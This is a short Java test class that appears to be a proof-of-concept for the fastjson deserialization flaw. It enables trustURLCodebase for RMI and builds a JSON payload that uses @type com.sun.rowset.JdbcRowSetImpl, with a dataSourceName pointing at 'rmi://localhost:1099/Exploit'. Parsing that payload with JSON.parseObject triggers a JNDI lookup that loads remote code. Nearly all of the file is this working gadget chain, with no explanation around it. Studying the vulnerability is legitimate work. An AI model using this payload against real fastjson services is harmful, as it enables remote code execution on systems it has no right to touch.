package com.fastjson;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.sql.DataSource;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;

public class Test3 {

    public static void main(String[] args) throws NamingException {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        ParserConfig.getGlobalInstance().setSafeMode(true);
//        String jsonString2 = "{\"@type\":\"com.fastjson.DB\",\"dburl\":\"127.0.0.1\"}\r\n";
        
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        InitialContext initialContext = new InitialContext();
//        DataSource dataSource = (DataSource)initialContext.lookup("rmi://localhost:1099/Exploit");
        
        String jsonString2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}";

        System.out.println("toJSONString : " + jsonString2);

//        JSON.parse(jsonString2);
        Buy newBuy2 = JSON.parseObject(jsonString2, Buy.class);

    }

}
